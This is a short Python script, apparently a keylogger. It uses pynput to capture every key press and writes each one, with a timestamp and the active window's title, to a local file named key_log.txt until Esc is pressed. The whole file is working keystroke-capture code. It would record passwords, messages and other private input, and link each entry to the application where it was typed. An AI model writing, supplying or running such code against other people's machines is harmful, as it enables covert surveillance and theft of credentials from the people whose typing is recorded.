from pynput import keyboard
import pygetwindow as gw
import os
import time

# Specify the file to save the keystrokes
log_file = "key_log.txt"

def get_active_window():
    try:
        window = gw.getActiveWindow()
        if window:
            return window.title
    except:
        return None

def on_press(key):
    active_window = get_active_window()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a", encoding='utf-8') as f:  # Specify utf-8 encoding here
            f.write(f"{timestamp} - {active_window} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a", encoding='utf-8') as f:  # Specify utf-8 encoding here
            if key == keyboard.Key.space:
                f.write(f"{timestamp} - {active_window} - [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"{timestamp} - {active_window} - [ENTER]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"{timestamp} - {active_window} - [BACKSPACE]\n")
            elif key == keyboard.Key.tab:
                f.write(f"{timestamp} - {active_window} - [TAB]\n")
            elif key == keyboard.Key.shift:
                f.write(f"{timestamp} - {active_window} - [SHIFT]\n")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write(f"{timestamp} - {active_window} - [CTRL]\n")
            else:
                f.write(f"{timestamp} - {active_window} - [{key}]\n")


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()